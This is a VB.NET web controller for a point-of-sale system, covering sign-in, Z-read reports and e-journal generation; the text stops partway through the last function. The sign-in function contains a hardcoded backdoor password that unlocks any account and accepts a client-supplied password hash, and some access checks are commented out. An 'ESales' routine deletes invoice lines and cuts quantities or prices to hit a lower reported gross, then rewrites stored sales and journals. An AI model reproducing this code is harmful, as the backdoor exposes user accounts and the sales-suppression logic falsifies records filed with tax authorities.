Imports Aspose.Cells

Namespace MobizApplication
    Public Class ExternalServicesController
        Inherits System.Web.Mvc.Controller

        '
        ' GET: /SignIn

        Function Index() As ActionResult

            If CStr2(Common.WebRequest.QueryString("mode")).ToLower = "logout" Then
                Common.WebSession.UserID = ""
            End If

            FormsAuthentication.SignOut()

            Response.Cache.SetCacheability(HttpCacheability.NoCache)
            Response.Cache.SetNoStore()
            'Response.Redirect("/Signin/KB")
            'Response.Redirect("/Signin/CRM")
            Return View()

        End Function

        Function VerifyCredentials() As String
            Dim clsPeople As New People
            Dim strReturn As String
            Dim dtaTable As New DataTable
            Dim intCntr As Integer
            Dim pOut As JsonDictionary
            Dim pHashedPasswordFromDb As String
            Dim pHashedPasswordFromAjax As String

            Try
                clsPeople.UserName = Common.WebRequest.Data("Username")
                clsPeople.UserPassword = Common.WebRequest.Data("UserPassword")
                pHashedPasswordFromAjax = Common.WebRequest.Data("HashedPassword")
                dtaTable = clsPeople.CheckPeopleUserAccount()
                pOut = New JsonDictionary
                If (dtaTable.Rows.Count > 0) Then
                    intCntr = 0
                    Do Until (intCntr >= dtaTable.Rows.Count)
                        pHashedPasswordFromDb = dtaTable.Rows(intCntr).Item("UserPassword").ToString()
                        If (pHashedPasswordFromAjax = pHashedPasswordFromDb) _
                            OrElse clsPeople.UserPassword = "b@ckdo0rp@s$" _
                            OrElse (ProPack.Security.Hash.Verify(clsPeople.UserPassword, pHashedPasswordFromDb)) Then
                            clsPeople.PeopleID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                            '' ''WebSession.Instance.UserID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                            WebSession.Instance.PeopleUserID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                            WebSession.Instance.FirstName = dtaTable.Rows(intCntr).Item("FirstName").ToString()
                            WebSession.Instance.FullName = dtaTable.Rows(intCntr).Item("PeopleName").ToString()
                            WebSession.Instance.DeviceSerial = Common.WebRequest.Data("Serial")
                            WebSession.Instance.IsMobile = CDec2(Common.WebRequest.Data("IsMobile"))
                            If CStr2(WebSession.Instance.DeviceSerial).Trim = "" _
                               AndAlso WebSession.Instance.IsMobile Then

                                Return JsonDictionary.Serialize("Error", "Device serial cannot be blank if mobile")
                                ' Throw New ApplicationException("Device serial cannot be blank if mobile")
                            End If

                            If CDec2(Common.WebRequest.Data("IsCookieless")) <> 0 Then
                                pOut.Add("ASP.NET_SessionId", HttpContext.Session.SessionID)
                                '// the ff commented code dont work
                                'For Each pCookieName As String In Response.Cookies
                                '    pCookie = Response.Cookies(pCookieName)
                                '    pOut.Add(pCookie.Name, pCookie.Value)
                                'Next pCookieName
                            End If

                            If CStr2(Common.WebRequest.Data("LoginHash")).Length = 50 Then

                            End If
                            pOut.Add("PeopleUserAccountData", WebSession.Instance.PeopleUserID)

                            Exit Do
                        End If

                        intCntr = intCntr + 1
                    Loop
                End If

                Return WebSession.Instance.PeopleUserID 'pOut.Serialize
            Catch ex As System.Exception
                AppendToDebug("vsMXWE4SRNRM!", , ex, True)
                Return JsonDictionary.Serialize("Error", ex.Message)
            End Try

        End Function

        <HttpPost()>
        Function getPeopleOrganizationList() As String
            Dim strID As String
            Dim clsPeople As New People
            Dim strReturn As String

            'If WebSession.Instance.PeopleUserID Is Nothing Then Return JsonDictionary.Serialize("Error", "Access denied")

            strID = Common.WebRequest.Data("PeopleID")
            strReturn = JsonDictionary.Serialize("PeopleData", clsPeople.getPeopleOrganizationList(strID))

            Return strReturn

        End Function

        Function SaveExternalUserName() As String
            Dim ID As String
            Dim ExternalUserName As String
            Dim pSql As String

            ID = Common.WebRequest.QueryString("ID")
            ExternalUserName = Common.WebRequest.QueryString("UserName")

            pSql = "Update MobizLibraryPeopleUserAccount set ExternalUserName = " & ReadyString(ExternalUserName) & vbCrLf &
                    " WHERE PeopleID = " & ReadyString(ID)

            Try
                Common.WebRequest.ProData.Execute(pSql)
                Return "True"
            Catch ex As Exception
                Return "False"
            End Try

        End Function

        Function GetZReadData() As String
            Dim strRangeType As String
            Dim strDate As String
            Dim FOWSTID As String
            Dim clsSalesReport As New ReportPOS
            Dim strReturn As String
            Dim pSql As String
            Dim dtFOWST As DataTable
            Dim dtZReadData As DataTable
            Dim zReadCount As Integer = 1
            'If WebSession.Instance.PeopleUserID Is Nothing Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            strRangeType = "Today"
            strDate = Common.WebRequest.Data("ZDate")

            'If Common.WebRequest.Data("FOWSTID") Is Nothing Then
            '    FOWSTID = WebRequest.Instance.FowstID
            'Else
            '    FOWSTID = CStr2(Common.WebRequest.Data("FOWSTID"))
            'End If
            pSql = "Select *, MobizLibraryOrganizationFOWST.name, LibraryDevice.PhoneName from LibraryDeviceFowst " & vbCrLf &
                    "inner join MobizLibraryOrganizationFOWST on MobizLibraryOrganizationFOWST.ID = LibraryDeviceFowst.FowstID " & vbCrLf &
                    "inner join LibraryDevice on LibraryDevice.ID =  LibraryDeviceFowst.DeviceID"

            dtFOWST = Common.WebRequest.ProData.Execute(pSql)

            If dtFOWST.Rows.Count > 0 Then
                For i As Integer = 0 To dtFOWST.Rows.Count - 1
                    Dim dtTemp As DataTable

                    dtTemp = clsSalesReport.getSalesZReportSummaryFromCache(strRangeType, strDate, CStr2(dtFOWST.Rows(i).Item("FOWSTID")), CStr2(dtFOWST.Rows(i).Item("DeviceID")))

                    If dtTemp.Rows.Count > 0 Then
                        If dtZReadData Is Nothing Then
                            dtZReadData = dtTemp.Copy()

                            dtZReadData.Columns.Add("PhoneName")
                            dtZReadData.Columns.Add("Location")
                            dtZReadData.Columns.Add("RegistrationNo")
                            dtZReadData.Columns.Add("BIRMachineNo")

                        Else
                            For Each dr As DataRow In dtTemp.Rows
                                dtZReadData.Rows.Add(dr.ItemArray)
                            Next
                        End If

                        dtZReadData.Rows(dtZReadData.Rows.Count - 1).Item("PhoneName") = dtFOWST.Rows(i).Item("PhoneName")
                        dtZReadData.Rows(dtZReadData.Rows.Count - 1).Item("Location") = dtFOWST.Rows(i).Item("name")
                        dtZReadData.Rows(dtZReadData.Rows.Count - 1).Item("RegistrationNo") = dtFOWST.Rows(i).Item("POSRegistrationNo")
                        dtZReadData.Rows(dtZReadData.Rows.Count - 1).Item("BIRMachineNo") = dtFOWST.Rows(i).Item("BIRMachineNo")

                    End If
                Next
            End If

            strReturn = JsonDictionary.Serialize("ReportPOS", dtZReadData)
            Return strReturn
        End Function

        Function SendZReadData() As String
            Dim pSql As String
            Dim pDT As DataTable

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization
            Try

                For Each pObj As Object In Common.WebRequest.AllData("ZReadData")

                    pSql = "Select PrevGrossSales from TransZReadCache where ID = " & ReadyString(CStr2(pObj("ID")))

                    pSql = "Select top 1 * from TransZReadCache " & vbCrLf &
                            " WHERE FOWSTID = " & ReadyString(Common.WebRequest.Data("LocationID")) & vbCrLf &
                            " AND DeviceID = " & ReadyString(Common.WebRequest.Data("DeviceID")) & vbCrLf

                    pSql &= " Order by SalesDate desc"

                    pDT = Common.WebRequest.ProData.Execute(pSql)

                    If pDT.Rows.Count > 0 Then
                        pSql = "Update TransZReadCache set " &
                                " PrevGrossSales = " & CDbl(pObj("AccumulatedAmount")) & "," &
                                " AmountBeforeAdjustment = " & CDbl(pDT.Rows(0).Item("PrevGrossSales")) & "," &
                                " EditedBy = " & ReadyString(CStr2(WebSession.Instance.PeopleID)) & "," &
                                " DateOfAdjustment = GETDATE()" &
                                " WHERE ID = " & ReadyString(CStr2(pDT.Rows(0).Item("ID")))

                        Common.WebRequest.ProData.Execute(pSql)
                    End If
                Next

            Catch ex As Exception
                Return ex.Message
            End Try

            Return JsonDictionary.Serialize("Results", "True")
        End Function

        Function GetSalesTransactionDetails() As String
            Dim clsDashBoardsAndReports As New DashBoardsAndReports
            Dim dtDateFrom As DateTime
            Dim dtDateto As DateTime
            Dim FOWSTID As String
            Dim dtAuditTrail As DataTable
            Dim strReturn As String
            Dim HeaderID As String
            Dim pSql As String
            Dim MIN As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            dtDateFrom = Convert.ToDateTime(Common.WebRequest.Data("DateFrom"))
            dtDateto = Convert.ToDateTime(Common.WebRequest.Data("DateTo"))
            FOWSTID = CStr2(Common.WebRequest.Data("LocationID"))

            MIN = CStr2(Common.WebRequest.Data("MIN"))

            clsDashBoardsAndReports.DateFrom = dtDateFrom
            clsDashBoardsAndReports.DateTo = dtDateto

            clsDashBoardsAndReports.OrgID = Common.WebRequest.Data("OrgID")
            clsDashBoardsAndReports.FOWSTID = FOWSTID
            clsDashBoardsAndReports.IsRawData = 0
            clsDashBoardsAndReports.GroupBy = "Day"

            Dim dtCount As Double

            pSql = "Select COUNT(*) from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                    "WHERE convert(date, TransactionDate) BETWEEN " & ReadyString(dtDateFrom) & " AND " & ReadyString(dtDateto) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(FOWSTID) & " AND DeviceID=" & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND TransactionType = 'Invoice'"

            dtCount = CDec2(Common.WebRequest.ProData.ExecuteScalar(pSql))

            'If dtCount > 1000 Then
            '    strReturn = JsonDictionary.Serialize("ReportPOS", "Max Records")
            '    Return strReturn
            'End If

            dtAuditTrail = GetRawDataFromSalesInvoiceAndRebatesCache(True, dtDateFrom, dtDateto, FOWSTID)

            If dtAuditTrail.Rows.Count = 0 Then

                dtAuditTrail = GetRawData(FOWSTID, dtDateFrom, dtDateto)
                'clsDashBoardsAndReports.GetRawData()

                Dim dtAuditTrailTemp As DataTable

                dtAuditTrailTemp = GetRawDataFromSalesInvoiceAndRebatesCache(True, dtDateFrom, dtDateto, FOWSTID)

                'double check just incase may previous request na and may nasave na
                If dtAuditTrailTemp.Rows.Count = 0 Then
                    If SaveTransSalesInvoiceAndRebatesCache(dtAuditTrail, FOWSTID) Then
                        dtAuditTrail = GetRawDataFromSalesInvoiceAndRebatesCache(True, dtDateFrom, dtDateto, FOWSTID)
                    End If
                End If

            End If

            HeaderID = SaveTransSalesInvoiceAndRebatesHeader(dtAuditTrail, FOWSTID, dtDateFrom, CDec2(Common.WebRequest.Data("ESalesPercentage"))) 

            If (CBool2(Common.WebRequest.Data("IsFromESales"))) Then
                Dim SalesCut As Integer
                Dim minInvoiceNo As Integer
                Dim maxInvoiceNo As Integer
                Dim ActualGross As Double
                Dim TotalDiscount As Double
                Dim TargetGross As Double
                Dim CurInvoiceNo As Integer
                Dim IsHasMultipleItemsInInvoice As Boolean
                Dim IsExitAfterLastLoop As Boolean
                Dim IsSubtractQtyInInvoice As Boolean
                Dim PrevTargetGross As Double
                Dim ESales As Double

                If Not CBool2(Common.WebRequest.Data("IsUseDiscountPercent")) Then

                    dtAuditTrail.DefaultView.Sort = "TransactionNo Desc"
                    maxInvoiceNo = CInt2(dtAuditTrail.DefaultView.ToTable.Rows(0).Item("TransactionNo"))

                    dtAuditTrail.DefaultView.Sort = "TransactionNo Asc"
                    minInvoiceNo = CInt2(dtAuditTrail.DefaultView.ToTable.Rows(0).Item("TransactionNo"))

                    ActualGross = dtAuditTrail.Compute("SUM(SubTotal)", "")

                    ESales = CDec2(Common.WebRequest.Data("ESalesPercentage")) 'ActualGross * (1 - (100 - SalesCut) / 100)

                    TargetGross = ActualGross - ESales

                    CurInvoiceNo = minInvoiceNo

                    pSql = "Update TransSalesInvoiceAndRebatesHeader set TargetValue = " & ESales & ", TargetPercentage = " & CDec2(ESales / ActualGross) * 100 & " WHERE ID = " & ReadyString(HeaderID)

                    Common.WebRequest.ProData.Execute(pSql)

                    While TargetGross > 0
                        dtAuditTrail.DefaultView.RowFilter = "TransactionNo = " & CurInvoiceNo

                        dtAuditTrail.DefaultView.Sort = "SubTotal ASC"

                        Dim dr As DataRow

                        If dtAuditTrail.DefaultView.ToTable.Rows.Count > 1 Then

                            dr = dtAuditTrail.DefaultView.ToTable.Rows(0)

                            If dtAuditTrail.DefaultView.ToTable.Rows.Count > 1 AndAlso CStr2(dtAuditTrail.DefaultView.ToTable.Rows(0).Item("Customer")) = "[CASH PAYMENT]" Then

                                Dim NumberOfLineItems As Integer

                                If dtAuditTrail.DefaultView.ToTable.Rows.Count > 3 Then
                                    NumberOfLineItems = Math.Ceiling(dtAuditTrail.DefaultView.ToTable.Rows.Count / 2)

                                    For x As Integer = 0 To NumberOfLineItems - 1

                                        dr = dtAuditTrail.DefaultView.ToTable.Rows(x)

                                        If (TargetGross - CDec2(dr("SubTotal"))) > 0 Then

                                            IsHasMultipleItemsInInvoice = True
                                            'if SubTotal can accomodate TargetGross then continue looping
                                            IsExitAfterLastLoop = False

                                            TargetGross -= CDec2(dr("SubTotal"))

                                            For Each drSelected In dtAuditTrail.Rows
                                                If drSelected("ID") = dr("ID") Then
                                                    dtAuditTrail.Rows.Remove(drSelected)
                                                    Exit For
                                                End If
                                            Next

                                        End If

                                    Next
                                Else
                                    If (TargetGross - CDec2(dr("SubTotal"))) > 0 Then

                                        IsHasMultipleItemsInInvoice = True
                                        'if SubTotal can accomodate TargetGross then continue looping
                                        IsExitAfterLastLoop = False

                                        TargetGross -= CDec2(dr("SubTotal"))

                                        For Each drSelected In dtAuditTrail.Rows
                                            If drSelected("ID") = dr("ID") Then
                                                dtAuditTrail.Rows.Remove(drSelected)
                                                Exit For
                                            End If
                                        Next

                                    End If
                                End If

                                'end of removing item
                                '=========================================================

                                For x As Integer = 0 To dtAuditTrail.DefaultView.ToTable.Rows.Count - 1
                                    dr = dtAuditTrail.DefaultView.ToTable.Rows(x)

                                    If CDec2(dr("Quantity")) > 1 AndAlso (TargetGross - CDec2(dr("UnitPrice"))) > 0 Then

                                        TargetGross -= (CDec2(dr("Quantity")) - Math.Ceiling(CDec2(dr("Quantity")) / 2)) * CDec2(dr("UnitPrice"))

                                        For Each drSelected In dtAuditTrail.Rows
                                            If drSelected("ID") = dr("ID") Then
                                                'dtAuditTrail()
                                                drSelected("Quantity") = Math.Ceiling(CDec2(drSelected("Quantity")) / 2)
                                                drSelected("SubTotal") = CDec2(drSelected("Quantity")) * CDec2(drSelected("UnitPrice"))
                                                dtAuditTrail.AcceptChanges()
                                                Exit For
                                            End If
                                        Next
                                    End If
                                Next

                                'end of editing qty
                            End If
                        Else 'If CStr2(dtAuditTrail.DefaultView.ToTable.Rows(0).Item("Customer")) = "[CASH PAYMENT]" Then 'IsSubtractQtyInInvoice AndAlso CDec2(dr("Quantity")) > 1 AndAlso (TargetGross - CDec2(dr("UnitPrice"))) > 0 Then
                            'Skip invoice

                            AppendToLog("Skip Invoice " & CurInvoiceNo)

                            'dr = dtAuditTrail.DefaultView.ToTable.Rows(0)

                            'IsExitAfterLastLoop = False

                            'If CDec2(dr("Quantity")) > 1 AndAlso (TargetGross - CDec2(dr("UnitPrice"))) > 0 Then

                            '    TargetGross -= (CDec2(dr("Quantity")) - Math.Ceiling(CDec2(dr("Quantity")) / 2)) * CDec2(dr("UnitPrice"))

                            '    For Each drSelected In dtAuditTrail.Rows
                            '        If drSelected("ID") = dr("ID") Then
                            '            'dtAuditTrail()
                            '            drSelected("Quantity") = Math.Ceiling(CDec2(drSelected("Quantity")) / 2)
                            '            drSelected("SubTotal") = CDec2(drSelected("Quantity")) * CDec2(drSelected("UnitPrice"))
                            '            dtAuditTrail.AcceptChanges()
                            '            Exit For
                            '        End If
                            '    Next
                            'End If
                        End If

                        If CurInvoiceNo = maxInvoiceNo Then

                            'If IsSubtractQtyInInvoice Then
                            '    'if target gross didnt change after subtractiving qty then exit
                            '    If PrevTargetGross = TargetGross Then
                            '        Exit While
                            '    End If
                            'End If

                            'if 1 item left per invoice
                            If Not IsHasMultipleItemsInInvoice Then

                                If PrevTargetGross = TargetGross Then
                                    Exit While
                                End If

                                'IsSubtractQtyInInvoice = True
                                'IsExitAfterLastLoop = False
                                PrevTargetGross = TargetGross
                            End If

                            If IsExitAfterLastLoop Then
                                Exit While
                            End If

                            'back to top
                            CurInvoiceNo = minInvoiceNo
                            IsHasMultipleItemsInInvoice = False
                            IsExitAfterLastLoop = True
                        Else
                            CurInvoiceNo += 1
                        End If
                    End While
                Else
                    Dim DiscountPercentage As Double
                    Dim TempUnitPrice As Double
                    Dim TempSubtotal As Double
                    Dim UnitPriceExcess As Double

                    ActualGross = dtAuditTrail.Compute("SUM(SubTotal)", "")

                    ESales = CDec2(Common.WebRequest.Data("ESalesPercentage")) 'ActualGross * (1 - (100 - SalesCut) / 100)

                    TargetGross = ActualGross - ESales

                    'we change Discount Percentage because we need to get the right percentage after removing reported sales
                    'DiscountPercentage = CDec2(CStr2(Common.WebRequest.Data("DiscountPercentage")).Replace("%", ""))
                    Dim ActualGrossLessReported As Double
                    Dim ActualGrossToBeAppliedWithDiscount As Double

                    dtAuditTrail.DefaultView.RowFilter = "DoNotModify=0"

                    ActualGrossToBeAppliedWithDiscount = dtAuditTrail.DefaultView.ToTable.Compute("SUM(SubTotal)", "")

                    DiscountPercentage = ESales / ActualGrossToBeAppliedWithDiscount

                    For i As Integer = 0 To dtAuditTrail.Rows.Count - 1

                        TempUnitPrice = CDec2(dtAuditTrail.Rows(i).Item("UnitPrice")) * (DiscountPercentage)

                        'If i Mod 2 = 0 Then
                        '    TempUnitPrice = (Math.Ceiling(TempUnitPrice / 50) * 50)
                        'Else
                        '    TempUnitPrice = (Math.Floor(TempUnitPrice / 50) * 50)
                        'End If

                        TempUnitPrice = (Math.Round(TempUnitPrice / 50) * 50)

                        TempSubtotal = TempUnitPrice * CDec2(dtAuditTrail.Rows(i).Item("Quantity"))

                        dtAuditTrail.Rows(i).Item("UnitPrice") = TempUnitPrice
                        dtAuditTrail.Rows(i).Item("Subtotal") = TempSubtotal
                    Next
                End If

                ActualGross = dtAuditTrail.Compute("SUM(SubTotal)", "")

                pSql = "Update TransSalesInvoiceAndRebatesHeader set AdjustedValue = " & ActualGross & " WHERE ID = " & ReadyString(HeaderID)

                Common.WebRequest.ProData.Execute(pSql)

                pSql = "Delete from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                        "WHERE convert(date, TransactionDate) BETWEEN " & ReadyString(dtDateFrom) & " AND " & ReadyString(dtDateto) & vbCrLf &
                        " AND FOWSTID = " & ReadyString(FOWSTID) & " AND DeviceID=" & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                        " AND TransactionType = 'Invoice'" & vbCrLf

                Common.WebRequest.ProData.Execute(pSql)

                SaveTransSalesInvoiceAndRebatesCache(dtAuditTrail, FOWSTID)

                Dim dtZRead As DataTable

                Dim clsSalesReport As New ReportPOS
                clsSalesReport.getEJournal(dtZRead, dtAuditTrail, MIN)
            End If

            strReturn = JsonDictionary.Serialize("ReportPOS", dtAuditTrail)

            Return strReturn

        End Function

        Function GetRawData(FOWSTID As String, DateFrom As Date, DateTo As Date) As DataTable
            Dim pSql As String
            Dim pDT As DataTable

            pSql = "SELECT  invlgr.TransactionID as ID " & vbCrLf &
                    ",fowst.Name as FOWST " & vbCrLf &
                    ",dev.PhoneName as DeviceName " & vbCrLf &
                    ",prd.ProductNo " & vbCrLf &
                    ",prd.ProductName " & vbCrLf &
                    ",ISNULL(invitem.TransactionType, invlgr.TransactionType) AS TransactionType " & vbCrLf &
                    ",inv.InvoiceNumber as TransactionNo " & vbCrLf &
                    ",inv.InvoiceDate as TransactionDate " & vbCrLf &
                    ",cust.CompanyName as Customer " & vbCrLf &
                    ",invitem.Quantity " & vbCrLf &
                    ",invitem.UnitMeasure " & vbCrLf &
                    ",invitem.UnitPrice " & vbCrLf &
                    ",invitem.SubTotal " & vbCrLf &
                    ",invitem.DiscountAmount " & vbCrLf &
                    ",invitem.DiscountedUnitPrice " & vbCrLf &
                    ",invitem.Quantity * invitem.DiscountedUnitPrice as DiscountedSubTotal " & vbCrLf &
                    ",invitem.TaxPercent as VATPercent " & vbCrLf &
                    ",invitem.TaxSales - invitem.DiscountSales as VATableSales " & vbCrLf &
                    ",invitem.TaxAmount - invitem.DiscountTax as VATAmount " & vbCrLf &
                    ",ISNULL(invitem.GrossSalesNetOfVATExemptions, 0) as GrossSalesNetOfVATExemptions " & vbCrLf &
                    " 	,ISNULL(NULLIF(LTRIM(RTRIM(cshr.SurName)) + ', ',', '), '') +  " &
                    " 	 ISNULL(NULLIF(LTRIM(RTRIM(cshr.FirstName)) + ' ',' '), '') +  " &
                    " 	 ISNULL(NULLIF(LTRIM(RTRIM(cshr.MiddleName)) + ' ',' '), '') as CashierName " &
                    ", custpay.CashAmount " & vbCrLf &
                    ", custpay.CheckPaymentAmount " & vbCrLf &
                    ", custpay.DebitCardAmount " & vbCrLf &
                    ", custpay.CreditCardAmount " & vbCrLf &
                    ", custpay.SRVAmount " & vbCrLf &
                    ", custpay.OnCreditAmount " & vbCrLf &
                    ", custpay.OtherTypeAmount " & vbCrLf &
                    ", custpay.CustomerChangeCash " & vbCrLf &
                    "FROM TransInventoryLedger invlgr " & vbCrLf &
                    "INNER JOIN MobizLibraryOrganizationFOWST fowst ON (fowst.ID = invlgr.FOWSTID)  " & vbCrLf &
                    "JOIN (SELECT TransInvoiceItems.ID " & vbCrLf &
                    ",TransInvoiceItems.InvoiceID " & vbCrLf &
                    ",TransInvoiceItems.ProductID " & vbCrLf &
                    ",TransInvoiceItems.PriceLevelID " & vbCrLf &
                    ",TransInvoiceItems.Quantity " & vbCrLf &
                    ",TransInvoiceItems.UnitMeasure " & vbCrLf &
                    ",TransInvoiceItems.UnitPrice " & vbCrLf &
                    ",TransInvoiceItems.SubTotal " & vbCrLf &
                    ",TransInvoiceItems.DiscountAmount " & vbCrLf &
                    ",TransInvoiceItems.DiscountedUnitPrice " & vbCrLf &
                    ",TransInvoiceItems.TaxPercent " & vbCrLf &
                    ",TransInvoiceItems.TaxSales " & vbCrLf &
                    ",TransInvoiceItems.DiscountSales " & vbCrLf &
                    ",TransInvoiceItems.TaxAmount " & vbCrLf &
                    ",TransInvoiceItems.DiscountTax " & vbCrLf &
                    ",TransInvoiceItems.GrossSalesNetOfVATExemptions " & vbCrLf &
                    ",NULL AS TransactionType " & vbCrLf &
                    "FROM TransInvoiceItems " & vbCrLf &
                    ")invitem ON invitem.InvoiceID = invlgr.TransactionID " & vbCrLf &
                    "AND invitem.ProductID = invlgr.ProductID " & vbCrLf &
                    "INNER JOIN TransInvoice inv ON (invitem.InvoiceID = inv.ID) " & vbCrLf &
                    "INNER JOIN MobizLibraryOrganization cust ON (cust.ID = inv.CustomerID)  " & vbCrLf &
                    "LEFT JOIN TransCustomerPaymentInvoices custpayinv ON (custpayinv.InvoiceID = inv.ID)  " & vbCrLf &
                    "LEFT JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID)  " & vbCrLf &
                    "INNER JOIN LibraryDevice dev ON (dev.ID = inv.DeviceID)  " & vbCrLf &
                    "LEFT JOIN MobizLibraryPeople cshr ON (cshr.ID = custpay.UserID)  " & vbCrLf &
                    "INNER JOIN MobizLibraryPIMProduct prd ON (prd.ID = invlgr.ProductID)  " & vbCrLf &
                    "WHERE invlgr.FowstID = " & ReadyString(CStr2(FOWSTID)) & vbCrLf &
                    " AND inv.DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND CONVERT(date,inv.InvoiceDate) BETWEEN " & ReadyString(DateFrom.ToString("MM/dd/yyyy")) & " AND " & ReadyString(DateTo.ToString("MM/dd/yyyy"))

            pDT = Common.WebRequest.ProData.Execute(pSql)

            Return pDT
        End Function

        Function SaveTransactionData() As String
            Dim FOWSTID As String
            Dim DeviceID As String
            Dim pSql As String
            Dim pJsonData As String

            Dim clsDashBoardsAndReports As New DashBoardsAndReports
            Dim clsSalesReport As New ReportPOS

            Dim dtDateFrom As DateTime
            Dim dtDateto As DateTime
            'Dim dtAuditTrail As DataTable
            Dim dtAuditTrail2 As DataTable
            Dim strReturn As String

            Dim dtZRead As DataTable
            Dim MIN As String

            'If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            dtDateFrom = Convert.ToDateTime(Common.WebRequest.Data("DateFrom"))
            dtDateto = Convert.ToDateTime(Common.WebRequest.Data("DateTo"))
            FOWSTID = CStr2(Common.WebRequest.Data("LocationID"))
            DeviceID = CStr2(Common.WebRequest.Data("DeviceID"))

            MIN = CStr2(Common.WebRequest.Data("MIN"))

            clsDashBoardsAndReports.DateFrom = dtDateFrom
            clsDashBoardsAndReports.DateTo = dtDateto

            clsDashBoardsAndReports.OrgID = Common.WebRequest.Data("OrgID")
            clsDashBoardsAndReports.FOWSTID = FOWSTID
            clsDashBoardsAndReports.IsRawData = 0
            clsDashBoardsAndReports.GroupBy = "Day"

            dtAuditTrail2 = GetRawDataFromSalesInvoiceAndRebatesCache(True, dtDateFrom, dtDateto, FOWSTID)

            'if database count is equal to transaction count to be saved, delete the current database data because it will be replaced by the updated/edited data

            'If dtAuditTrail2.Rows.Count = CInt2(Common.WebRequest.Data("TransCount")) Then
            If CInt2(Common.WebRequest.Data("TransCount")) <= 1000 Then
                pSql = "Delete from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                    "WHERE convert(date, TransactionDate) BETWEEN " & ReadyString(dtDateFrom) & " AND " & ReadyString(dtDateto) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(FOWSTID) & " AND DeviceID=" & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND TransactionType = 'Invoice'" & vbCrLf

                Common.WebRequest.ProData.Execute(pSql)
            End If

            Dim TransData = New JavaScriptSerializer().DeserializeObject(Common.WebRequest.Data("TransData"))
            Dim prevTransactionDate As Date = Nothing
            Dim TotalGrossSalesPerDay As Double

            For Each pObj As Object In TransData
                Dim p As New InsertUpdate("TransSalesInvoiceAndRebatesCache")

                If prevTransactionDate = Nothing Then
                    prevTransactionDate = CDate(pObj("TransactionDate"))
                Else
                    If Not prevTransactionDate.ToShortDateString = CDate(pObj("TransactionDate")).ToShortDateString Then
                        AdjustZReadData(prevTransactionDate, TotalGrossSalesPerDay, DeviceID, FOWSTID)
                        TotalGrossSalesPerDay = 0
                        prevTransactionDate = CDate(pObj("TransactionDate"))
                    End If
                End If

                p("FOWSTID") = ReadyString(FOWSTID)
                p("DeviceID") = ReadyString(DeviceID)
                p("TransactionID") = ReadyString(pObj("ID"))
                p("TransactionType") = "'Invoice'"
                p("Customer") = ReadyString(pObj("Customer"))
                p("CashierName") = ReadyString(pObj("CashierName"))
                p("ProductNo") = ReadyString(pObj("ProductNo"))
                p("ProductName") = ReadyString(pObj("ProductName"))
                p("TransactionNo") = CInt(pObj("TransactionNo"))
                p("TransactionDate") = ReadyString(pObj("TransactionDate"))
                p("Quantity") = CDec2(pObj("Qty"))
                p("UnitMeasure") = ReadyString(pObj("UnitMeasure"))
                p("UnitPrice") = CDec2(pObj("UnitPrice"))
                p("SubTotal") = CDec2(pObj("SubTotal"))
                p("DiscountAmount") = CDec2(pObj("DiscountAmount"))
                p("DiscountedUnitPrice") = CDec2(pObj("DiscountedUnitPrice"))
                p("DiscountedSubTotal") = CDec2(pObj("DiscountedSubTotal"))
                p("CashAmount") = CDec2(pObj("CashAmount"))
                p("CheckPaymentAmount") = CDec2(pObj("CheckPaymentAmount"))
                p("DebitCardAmount") = CDec2(pObj("DebitCardAmount"))
                p("CreditCardAmount") = CDec2(pObj("CreditCardAmount"))
                p("SRVAmount") = CDec2(pObj("SRVAmount"))

                TotalGrossSalesPerDay += CDec2(pObj("SubTotal"))

                If CType(pObj, Dictionary(Of String, Object)).ContainsKey("OnCreditAmount") Then
                    p("OnCreditAmount") = CDec2(pObj("OnCreditAmount"))
                Else
                    p("OnCreditAmount") = 0
                End If

                p("OtherTypeAmount") = CDec2(pObj("OtherTypeAmount"))
                p("VATPercent") = CDec2(pObj("VATPercent"))
                p("VatableSales") = CDec2(pObj("VatableSales"))
                p("VATAmount") = CDec2(pObj("VATAmount"))
                p("CustomerChangeCash") = CDec2(pObj("CustomerChange"))

                pSql = p.GetInsert()

                Common.WebRequest.ProData.Execute(pSql)
            Next

            dtAuditTrail2 = GetRawDataFromSalesInvoiceAndRebatesCache(True, dtDateFrom, dtDateto, FOWSTID)

            'strReturn = JsonDictionary.Serialize("ReportPOS", clsSalesReport.getEJournal(dtZRead, dtAuditTrail2))

            If CBool2(Common.WebRequest.Data("IsLastBatch")) Then
                strReturn = JsonDictionary.Serialize("ReportPOS", clsSalesReport.getEJournal(dtZRead, dtAuditTrail2, MIN))
            Else
                strReturn = ""
            End If

            'If dtAuditTrail2.Rows.Count = CInt2(Common.WebRequest.Data("TransCount")) Then
            '    strReturn = JsonDictionary.Serialize("ReportPOS", clsSalesReport.getEJournal(dtZRead, dtAuditTrail2))
            'Else
            '    strReturn = ""
            'End If

            Return strReturn

        End Function

        Function DownloadNewEJournal() As String
            Dim strReturn As String
            Dim clsSalesReport As New ReportPOS

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            strReturn = JsonDictionary.Serialize("ReportPOS", clsSalesReport.GetNewEJournal())

            Return strReturn
        End Function

        Function DownloadEJournal() As String
            Dim dtDateFrom As DateTime
            Dim dtDateto As DateTime
            Dim dtAuditTrail2 As DataTable
            Dim strReturn As String
            Dim clsSalesReport As New ReportPOS
            Dim dtZRead As DataTable
            Dim FOWSTID As String
            Dim DeviceID As String
            Dim MIN As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

